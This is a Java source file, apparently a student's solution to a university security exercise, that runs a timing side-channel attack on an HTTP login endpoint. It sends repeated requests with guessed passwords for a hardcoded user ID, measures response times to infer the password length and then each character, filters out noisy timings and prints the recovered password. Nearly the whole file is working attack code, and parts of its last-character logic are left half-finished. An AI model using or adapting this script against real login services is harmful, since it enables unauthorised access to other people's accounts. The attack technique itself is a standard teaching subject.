import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

public class ex01_M2 {

    //שונות, ממוצע, סטטיסטיקה, סטיית תקן
    private final static String USER = "201553864";//"315617506";
    private final static String URL = "http://aoi.ise.bgu.ac.il/?user=" + USER + "&password=";
    private final static int MAX_PASSWORD_LENGTH = 32;
    private final static int LENGTH_TRIES = 10;
    private final static int CHAR_TRIES = 20;
    private final static double LENGTH_SEARCH_NOISE_REDUCE = 1.5;
    private final static double PASSWORD_SEARCH_NOISE_REDUCE = 2;
    private final static long TIME_SCALE = 10;
    private final static char[] CHARS = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

    public static void main(String[] args) throws Exception {

        findPassword();

        //int length = get_length();
        //String curl = URL;
        //for (int i = 0; i < length; i++){
        //    int char_location = 0;
        //    long[] averages = new long[CHARS.length];
//
        //    for (int j = 0; j < CHARS.length; j++){
        //        String temp = curl + CHARS[j];
        //        for(int k = 1; k < length - i; k++) {
        //            temp += 'a';
        //        }
        //        //System.out.println(temp);
        //        URL temp_url = new URL(temp);
        //        long[] times = new long[CHAR_TRIES];
        //        for (int k = 0; k < CHAR_TRIES; k++){
        //            times[k] = attempt(temp_url);
        //        }
//
        //        long average = get_average(times);
        //        for (int k = 0; k < CHAR_TRIES; k++) {
        //            while (times[k] > average * 2) {
        //                times[k] = attempt(temp_url);
        //            }
        //        }
        //        averages[j] = get_average(times);
        //        System.out.println(CHARS[j] + " " + averages[j]);
        //    }
        //    long max = averages[0];
//
        //    for (int k = 1; k < CHARS.length; k++) {
        //        if (averages[k] > max) {
        //            max = averages[k];
        //            char_location = k;
        //        }
        //    }
        //    System.out.println(CHARS[char_location]);
        //    curl += CHARS[char_location];
        //}
        //System.out.println(curl);
    }

    private static int get_length(){
//        for (int test = 0; test < 50; test++) {
//            long TEST_START = System.currentTimeMillis();
        String curl = URL;
        int password_length = 1;
        try {
            long[] averages = new long[MAX_PASSWORD_LENGTH];
            for (int i = 0; i < MAX_PASSWORD_LENGTH; i++) {
                curl += 'a';
                URL url = new URL(curl + 'a');
                long average = 0;
                long[] times = new long[LENGTH_TRIES];
                for (int j = 0; j < LENGTH_TRIES; j++) {
                    times[j] = attempt(url);
                }

                //clean noise
                average = get_average(times);
                //System.out.println("pre-clean average: " + average);
                for (int k = 0; k < LENGTH_TRIES; k++) {
                    while (times[k] > average * LENGTH_SEARCH_NOISE_REDUCE) {
                        times[k] = attempt(url);
                    }
                }

                average = get_average(times);

                //Printing times for observation
                //for (long time: times) {
                //    System.out.println(time);
                //}
                /////////////

                //System.out.println(i + "AVG: " + average);
                averages[i] = average;
                //System.out.println(curl);
            }
            //for (double avg: averages) {
            //    System.out.println(avg);
            //}
            long max = averages[0];
            password_length = 1;
            for (int i = 1; i < MAX_PASSWORD_LENGTH; i++) {
                if (averages[i] > max) {
                    max = averages[i];
                    password_length = i + 1;
                }
            }
            password_length++;
            System.out.println(password_length);
            return password_length;

            //System.out.println(in.readLine());
        } catch (Exception ex) {
            System.out.println("We have a problem");
            //System.out.println(ex.getStackTrace());
        }
//            System.out.println(System.currentTimeMillis() - TEST_START);
//        }
        return password_length;
    }

    private static long get_average(long[] times){
        long average = 0;
        for (long time: times) { average += time; }
        return (average/times.length);
    }

    private static long attempt(URL url) throws Exception {
        long startTime = System.nanoTime();
        BufferedReader in = new BufferedReader (new InputStreamReader((url.openConnection()).getInputStream()));
        return (System.nanoTime() - startTime) * TIME_SCALE;
    }

    private static URL[] createUrls(String url, int length, int location) throws Exception {
        URL[] urls = new URL[CHARS.length];
        for (int i = 0; i < CHARS.length; i++){
            String temp_url = url + CHARS[i];
            for(int k = 1; k < length - location; k++) {
                temp_url += 'a';
            }

            urls[i] = new URL(temp_url);
        }
        for (URL curl: urls) {
            System.out.println(curl);
        }
        return urls;
    }

    private static void findPassword() throws Exception {
        int length = get_length();
        String curl = URL;
        String password = "";

        for(int k = 0; k < length; k++){

            if (k == length - 1){
                find_last_char(curl,length, password);
            }

            long[][] times = new long[CHARS.length][CHAR_TRIES];
            URL[] urls = createUrls(curl, length, k);

            for (int i = 0; i < CHAR_TRIES; i++){

                for (int j = 0; j < CHARS.length; j++){

                    times[j][i] = attempt(urls[j]);

                }
            }
            //long average = get_average(times);
            //for (int k = 0; k < CHAR_TRIES; k++) {
            //    while (times[k] > average * 2) {
            //        times[k] = attempt(temp_url);
            //    }
            //}
            long[] averages = get_average_new(times, urls);
            for(int j = 0; j < CHARS.length; j++)
                System.out.println(CHARS[j] + " " + averages[j]);

            int char_location = getMax(averages);
            curl += CHARS[char_location];
            password += CHARS[char_location];
        }
        //System.out.println(curl);
        System.out.println(USER + " " + password);
    }

    private static long[] get_average_new(long[][] times, URL[] urls) throws Exception {
        long[] averages = new long[CHARS.length];

        for (int i = 0; i < CHARS.length; i++){
            //////
            long average = get_average(times[i]);
            for (int k = 0; k < times[i].length; k++){
                while (times[i][k] > average * PASSWORD_SEARCH_NOISE_REDUCE) {
                    times[i][k] = attempt(urls[i]);
                    average = get_average(times[i]);
                }
            }
            /////
            averages[i] = average;
        }
        return averages;
    }

    private static int getMax(long[] averages){

        //Re attempt if two averages are equal
        long max = averages[0];
        int char_location = 0;

        for (int k = 1; k < CHARS.length; k++) {
            if (averages[k] > max) {
                max = averages[k];
                char_location = k;
            }
        }
        return char_location;
    }

    private static int find_last_char(String curl, int length, String password) throws Exception {
        int last_char = -1;

        long[][] times = new long[CHARS.length][CHAR_TRIES];
        URL[] urls = createUrls(curl, length, length - 1);


        for (int j = 0; j < CHARS.length; j++){
            attempt_last(urls[j], CHARS[j], password);
        }

        //long average = get_average(times);
        //for (int k = 0; k < CHAR_TRIES; k++) {
        //    while (times[k] > average * 2) {
        //        times[k] = attempt(temp_url);
        //    }
        //}
        long[] averages = get_average_new(times, urls);
        //for(int j = 0; j < CHARS.length; j++)
        //    System.out.println(CHARS[j] + " " + averages[j]);

        int char_location = getMax(averages);
        curl += CHARS[char_location];
        password += CHARS[char_location];

        return last_char;
    }

    private static void attempt_last(URL url, char letter, String password) throws Exception {
        BufferedReader in = new BufferedReader (new InputStreamReader((url.openConnection()).getInputStream()));
        System.out.println(password + letter + " Results in: " + in.readLine());
    }
}
